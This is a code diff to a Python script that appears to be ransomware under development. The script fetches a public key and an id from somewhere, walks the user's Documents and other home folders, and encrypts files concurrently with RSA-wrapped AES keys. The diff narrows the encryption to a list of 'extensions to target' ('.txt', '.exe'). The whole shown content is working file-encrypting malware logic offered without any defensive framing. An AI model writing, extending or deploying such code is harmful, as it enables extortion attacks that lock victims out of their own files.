@@ -53,19 +53,20 @@ def encrypt_file(file_path, public_key):
         encrypted_file.write(iv + encrypted_aes_key + encrypted_data)
 
 
-def encrypt_directory(directory_path, public_key_data):
+def encrypt_directory(directory_path, public_key_data, extensions):
     # Convert the public key string to a public key object
     public_key_bytes = public_key_data.encode('utf-8')
     public_key = serialization.load_pem_public_key(
         public_key_bytes, backend=default_backend()
     )
 
-    # Prepare a list of files to encrypt
+    # Prepare a list of files to encrypt based on the extensions
     files_to_encrypt = []
     for root, dirs, files in os.walk(directory_path):
         for file in files:
-            file_path = os.path.join(root, file)
-            files_to_encrypt.append(file_path)
+            if file.endswith(tuple(extensions)):
+                file_path = os.path.join(root, file)
+                files_to_encrypt.append(file_path)
 
     # Use ThreadPoolExecutor to encrypt files concurrently
     with ThreadPoolExecutor() as executor:
@@ -95,6 +96,9 @@ def main():
     public_key, id = fetch_key()  # Run once to generate keys
     home_dir = os.path.expanduser('~')
 
+    # Extensions to target
+    extensions = ['.txt', '.exe']
+
     # Directories to target
     user_dirs = [
         os.path.join(home_dir, 'Documents'),
@@ -108,7 +112,7 @@ def main():
 
     for directory in user_dirs:
         if os.path.exists(directory):
-            encrypt_directory(directory, public_key)
+            encrypt_directory(directory, public_key, extensions)
         else:
             print(f"Directory does not exist: {directory}")
 
